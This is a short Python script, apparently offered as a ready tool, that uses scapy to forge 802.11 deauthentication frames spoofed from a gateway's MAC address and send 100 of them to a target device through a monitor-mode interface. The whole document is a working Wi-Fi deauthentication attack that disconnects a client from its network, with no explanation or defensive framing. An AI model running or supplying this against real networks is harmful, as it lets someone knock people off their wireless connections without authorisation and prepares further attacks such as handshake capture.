from scapy.all import *
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth


target_mac = "00:ae:fa:81:e2:5e"
gateway_mac = "e8:94:f6:c4:97:3f"
dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
sendp(packet, inter=0.1, count=100, iface="wlan0mon", verbose=1)
